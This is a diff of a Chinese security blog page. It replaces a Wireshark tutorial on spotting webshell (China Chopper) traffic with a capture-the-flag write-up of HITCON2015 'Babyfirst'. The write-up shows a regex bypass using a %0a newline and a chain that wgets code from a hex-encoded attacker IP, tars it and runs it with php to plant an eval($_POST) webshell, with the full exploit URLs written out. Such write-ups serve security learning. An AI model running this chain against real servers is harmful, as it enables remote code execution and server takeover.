@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pcap分析," />
+  <meta name="keywords" content="CTF,Linux,PHP," />
 
 
 
@@ -79,34 +79,25 @@
 
 
 
-<meta name="description" content="最近因为要参加信息安全铁人三项的线下赛，有数据分析赛这个类别，所以研究了一下wireshark，平时打CTF也会有pcap的题，还是很有必要掌握如何分析流量包的。">
-<meta name="keywords" content="pcap分析">
+<meta name="description" content="这是一道XMAN夏令营的练习题，查了下资料，发现也是HITCON2015的一道题。">
+<meta name="keywords" content="CTF,Linux,PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="wireshark的基本使用及分析流量包的技巧">
-<meta property="og:url" content="http://yoursite.com/2018/05/04/wireshark/index.html">
+<meta property="og:title" content="HITCON2015-Babyfirst">
+<meta property="og:url" content="http://yoursite.com/2018/08/07/HITCON2015-Babyfirst/index.html">
 <meta property="og:site_name" content="C0mRaDe&#39;s Blog">
-<meta property="og:description" content="最近因为要参加信息安全铁人三项的线下赛，有数据分析赛这个类别，所以研究了一下wireshark，平时打CTF也会有pcap的题，还是很有必要掌握如何分析流量包的。">
+<meta property="og:description" content="这是一道XMAN夏令营的练习题，查了下资料，发现也是HITCON2015的一道题。">
 <meta property="og:locale" content="zh-hk">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/3.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/4.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/5.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/6.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/10.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/11.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/12.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/13.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/14.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/15.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/16.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/18.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/17.png">
-<meta property="og:updated_time" content="2018-05-04T09:23:24.544Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/6.png">
+<meta property="og:updated_time" content="2018-08-06T18:14:56.795Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="wireshark的基本使用及分析流量包的技巧">
-<meta name="twitter:description" content="最近因为要参加信息安全铁人三项的线下赛，有数据分析赛这个类别，所以研究了一下wireshark，平时打CTF也会有pcap的题，还是很有必要掌握如何分析流量包的。">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/2.png">
+<meta name="twitter:title" content="HITCON2015-Babyfirst">
+<meta name="twitter:description" content="这是一道XMAN夏令营的练习题，查了下资料，发现也是HITCON2015的一道题。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/1.png">
 
 
 
@@ -136,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/05/04/wireshark/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/08/07/HITCON2015-Babyfirst/"/>
 
 
 
 
 
-  <title>wireshark的基本使用及分析流量包的技巧 | C0mRaDe's Blog</title>
+  <title>HITCON2015-Babyfirst | C0mRaDe's Blog</title>
   
 
 
@@ -249,7 +240,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/04/wireshark/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/07/HITCON2015-Babyfirst/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="C0mRaDe">
@@ -266,7 +257,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">wireshark的基本使用及分析流量包的技巧</h1>
+          <h1 class="post-title" itemprop="name headline">HITCON2015-Babyfirst</h1>
         
 
         <div class="post-meta">
@@ -278,8 +269,8 @@
               
                 <span class="post-meta-item-text">發表於</span>
               
-              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-05-04T17:16:16+08:00">
-                2018-05-04
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-08-07T02:08:36+08:00">
+                2018-08-07
               </time>
             
 
@@ -338,7 +329,11 @@
       
 
       
-        <p>最近因为要参加信息安全铁人三项的线下赛，有数据分析赛这个类别，所以研究了一下wireshark，平时打CTF也会有pcap的题，还是很有必要掌握如何分析流量包的。<a id="more"></a>从铁人三项直播课的一道流量包分析的例题开始入手，由于拿不到直播课的pcap包，所以只能截视频里的图<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/2.png" alt="image">首先在过滤器输入http，表示过滤出使用http协议的包。我们可以很容易就发现黑客和服务器的ip地址分别是什么，因为这里黑客对网站进行了漏洞扫描，有大量的POST请求<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/3.png" alt="image">然后，可以看到黑客分别对什么漏洞进行了扫描，比如请求的参数中有很多../，就是对文件包含漏洞的扫描，又比如请求的参数中有很多<code>select from</code>之类的语句，就是对sql注入漏洞的扫描<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/3.jpg" alt="image">然后，第一二个问题是，黑客最终获得了什么用户名和密码，首先，用<code>ip.addr==(黑客ip) and http.request.method==POST</code> 来过滤出黑客发出的POST请求，然后可以看到，黑客发出了大量的包含m=admin，和a=login参数的POST请求，可以判断出这是登录操作，然后在某一行停止了，开始发送另一种请求，可以判断出这一条POST请求登录成功了。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/4.jpg" alt="image">可以看到，username是root，password是123456。第三个问题是：黑客修改了什么文件？因为文件修改请求一般会用到诸如edit、upload、modify这样的词语，我们可以将它们加入过滤语句中，这时候语句要这么写：<code>http.request.uri matches &quot;edit|upload|modify&quot;</code>，然后就找到了这样的一条修改语句<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/5.jpg" alt="image">可以看到，修改的文件是index.html，所在目录是search。<br>第4、5个问题是黑客使用菜刀的完整链接地址和黑客使用菜刀的链接密码，首先要找出菜刀包，过滤条件还是<code>ip.addr==(黑客ip) and http.request.method==POST</code>，判断是不是菜刀包的方法是看这个包有没有eval和base64编码的字符。比赛会给5到15个pcap包，每个包的大小都有几百M，如果一个包中没有找到需要的数据，就到下一个包去找，然后，找出菜刀包。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/6.jpg" alt="image">铁人三项的数据分析赛有可能用到的菜刀有五种，不确定会是哪一种，每种菜刀发的包都是不一样的，可以看到直播课里用的菜刀发送了三条数据，其中，chopper就是黑客使用菜刀的链接密码。由于看直播的截图也很不方便，所以，我在我自己的服务器上放了个一句话木马，并且用菜刀去连接，首先我用了C刀去连，输入http过滤出http的包，然后，很容易就看到一条突兀的发向我的服务器的POST包<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/10.png" alt="image">然后，右键追踪tcp流查看它的详细信息<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/11.png" alt="image">可以看到，C刀发的包有两个参数，一个是key，负责执行action的语句，另一个就是action，首先，对数据进行urldecode，然后对action进行base64decode，可以看到，action实际上是一串php的代码<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/12.png" alt="image">然后，再到一个网站进行php代码的格式化操作，就可以看到格式化之后的php代码<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/13.png" alt="image">然后，在tcp流中可以看到，我的服务器返回了一个500error，具体原因我还没搞清楚，C刀如果不对包作修改的话是连不上我的服务器的，然后，我换了把过狗刀，它成功地连上了我的服务器。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/14.png" alt="image">然后，分析一下，先过滤出菜刀的包<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/15.png" alt="image">然后，点开其中一个看看追踪tcp流看看<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/16.png" alt="image">可以看到，过狗刀的包只有一个参数，然后，像之前那样，先urldecode，然后对base64的部分进行base64decode，可以看到，菜刀对modcode.html进行了操作<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/18.png" alt="image">至于题目里提到的黑客使用菜刀的完整连接地址，就是包里的Full Request URI<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wireshark/17.png" alt="image"></p>
+        <p>这是一道XMAN夏令营的练习题，查了下资料，发现也是HITCON2015的一道题。<br><a id="more"></a><br>题目给了以下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">'sandbox/'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) )</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"sorry"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    exec(<span class="string">'./ '</span> . implode(<span class="string">" "</span>, $args));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这里明显是要构造args为数组，正则限制了args的元素只能是字母和数字。<br>这里要用到正则表达式的一个小trick，表示结尾的$是可以匹配字符串结束时的换行符的，所以，在这题可以用一个url编码的换行符<code>%0a</code>来表示一句命令的结束。<br>注意到exec()的一开头有一个<code>./</code>，所以args的第一个参数可以随便输，然后带个换行符，然后就可以执行命令。<br>首先想到可以用wget来下载文件，要用10进制或者16进制的IP来绕过对符号的检测，这里有一个比较骚的地方，我还没搞懂：如果使用10进制IP，只能对使用nginx的服务器成功，对apache的服务器是会失败的。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/1.png" alt="image">但是，用十六进制IP，apache也可以成功。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/2.png" alt="image">接下来的问题是，通过这种方法，只能获得一个index.html，要如何才能执行php代码？这里要用到Linux的一个性质，把包含PHP代码的文件用tar打包，然后再用php去执行这个包，就可以执行包中的PHP代码：<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/3.png" alt="image">这时候还需要解决一个问题，wget获取的是index.html，既然不能出现’.’，怎么对index.html进行打包？解决方法是，先创建一个文件夹，再在这个文件夹里面wget，然后在文件夹外对文件夹进行tar打包，最后用php执行包。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/4.png" alt="image">可以看到，test中的PHP同样也可以被执行。<br><strong>解题过程</strong><br>首先在自己服务器上放一个写好的index.html，内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$f=fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">fwrite($f,<span class="string">'</span></span><br><span class="line"><span class="string">	&lt;?php phpinfo();</span></span><br><span class="line"><span class="string">	eval($_POST[1]);?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后，构造如下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://202.112.51.184:10081/?args[]=c%0a&amp;args[]=mkdir&amp;args[]=COMRADE%0a</span><br><span class="line">http://202.112.51.184:10081/?args[]=c%0A&amp;args[]=cd&amp;args[]=COMRADE%0a&amp;args[]=wget&amp;args[]=0x7BCF6311%0a</span><br><span class="line">http://202.112.51.184:10081/?args[]=c%0A&amp;args[]=tar&amp;args[]=cvf&amp;args[]=gobaby&amp;args[]=COMRADE%0a</span><br><span class="line">http://202.112.51.184:10081/?args[]=c%0A&amp;args[]=php&amp;args[]=gobaby%0a</span><br></pre></td></tr></table></figure></p>
+<p>然后，可以访问shell.php看看是否生效了。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/5.png" alt="image">可以看到，PHP代码被成功执行，接下来直接菜刀连接或者手打命令都可以了。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/HITCON2015-Babyfirst/6.png" alt="image"><br>这道题目做起来很好玩，思路和技巧都非常值得学习。另外，所有IP我都没有打码，希望大家别搞我，这台服务器仅仅作为平时各种测试用。</p>
+<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://blog.spoock.com/2017/09/09/Babyfirst-writeup/" target="_blank" rel="noopener">https://blog.spoock.com/2017/09/09/Babyfirst-writeup/</a></p>
 
       
     </div>
@@ -356,7 +351,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/pcap分析/" rel="tag"># pcap分析</a>
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
           
         </div>
       
@@ -369,8 +368,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/25/starctf/" rel="next" title="starCTF">
-                <i class="fa fa-chevron-left"></i> starCTF
+              <a href="/2018/06/12/python沙箱逃逸/" rel="next" title="python沙箱逃逸">
+                <i class="fa fa-chevron-left"></i> python沙箱逃逸
               </a>
             
           </div>
@@ -378,10 +377,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/05/06/RedHat/" rel="prev" title="2018-第二届红帽杯-writeup">
-                2018-第二届红帽杯-writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -433,8 +428,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -498,6 +502,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Referer"><span class="nav-number">1.</span> <span class="nav-text">Referer</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
